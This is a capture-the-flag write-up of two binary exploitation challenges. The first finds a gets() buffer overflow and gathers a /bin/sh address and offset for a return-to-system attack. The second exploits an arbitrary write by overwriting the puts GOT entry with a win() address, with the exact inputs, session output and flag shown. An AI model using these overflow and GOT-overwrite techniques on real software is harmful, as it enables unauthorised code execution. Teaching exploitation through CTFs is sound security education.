## Fridge

**Category**: pwn

**Author**: x03e

**Description**: We've experienced a data breach! Our forensics team detected unusual network activity originating from our new smart refrigerator. It turns out there's an old debugging service still running on it. Now it’s your job to figure out how the attackers gained access to the fridge! Suffering ends in 30 minutes. `nc chall.0xfun.org 12838`.

Putting the binary into ghidra I see there is a buffer overflow in the `set_welcome_message()` function:
```shell
void set_welcome_message(void)

{
  char local_30 [32];
  FILE *local_10;
  
  puts("New welcome message (up to 32 chars):");
  gets(local_30);
  local_10 = fopen(config_filepath,"w");
  if (local_10 == (FILE *)0x0) {
    puts("Unable to open config file.");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  fprintf(local_10,"welcome_msg: %s",local_30);
  fclose(local_10);
  return;
}
```
It allocates 32 bytes but has no bounds checking.

I find the address to `/bin/sh` with `ROPgadget`:
```shell
ROPgadget --binary vuln --string "/bin/sh"  
Strings information  
============================================================  
0x0804a09a : /bin/sh
```

Using `gdb`, and `cyclic()` and `cyclic_find()` from pwntools. `cyclic_find()` shows the offset is 44 bytes. Add 4 bytes for stack alignment.

```shell
objdump -d vuln | grep system

objdump -d vuln | grep exit

```

## What you have

**Category**: pwn

**Author**: x03e

**Description**: Bring it on! Show me EVERYTHING you’ve got! I want to see all you've got! Suffering ends in 30 minutes. `nc chall.0xfun.org 52079`.

I get the challenge file:
```shell
file chall  
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped

checksec --file=chall  
[*] '/home/user/Desktop/ctf/0xfun2026/chall'  
Arch:       amd64-64-little  
RELRO:      No RELRO  
Stack:      Canary found  
NX:         NX enabled  
PIE:        No PIE (0x400000)  
SHSTK:      Enabled  
IBT:        Enabled  
Stripped:   No
```
The binary has no PIE and no RELRO meaning function addresses are static and the GOT is writable.

I put the binary in ghidra and this is the main function:
```shell
undefined8 main(void)

{
  long in_FS_OFFSET;
  undefined8 *local_20;
  undefined8 local_18;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setbuf(stdout,(char *)0x0);
  puts("Show me what you GOT!");
  __isoc99_scanf(&DAT_0040206b,&local_20);
  puts("Show me what you GOT! I want to see what you GOT!");
  __isoc99_scanf(&DAT_0040206b,&local_18);
  *local_20 = local_18;
  puts("Goodbye!");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```
The program lets you write any 8 byte value (`*local_20 = local_18;`) to any address then calls `puts("Goodbye!")`.

I need to overwrite the GOT entry for `puts` with the address of the `win` function. When the program calls `puts("Goodbye!")` it will execute `win()` instead and print the flag.

Find the addresses for `win()` and `puts@GOT`:
```shell
objdump -R chall | grep puts  
0000000000403430 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5

objdump -d chall | grep win  
0000000000401236 <win>:  
4012b3:       75 19                   jne    4012ce <win+0x98>
```

```shell
python3 -c "print(int('0x403430',16))"  
4207664

python3 -c "print(int('0x401236',16))"  
4198966
```

Connect to the server and get the flag:
```shell
nc chall.0xfun.org 52079  
Show me what you GOT!  
4207664  
Show me what you GOT! I want to see what you GOT!  
4198966  
I like what you GOT! Take this: 0xfun{g3tt1ng_schw1fty_w1th_g0t_0v3rwr1t3s_1384311_m4x1m4l}  
.  
^C
```

`0xfun{g3tt1ng_schw1fty_w1th_g0t_0v3rwr1t3s_1384311_m4x1m4l}`
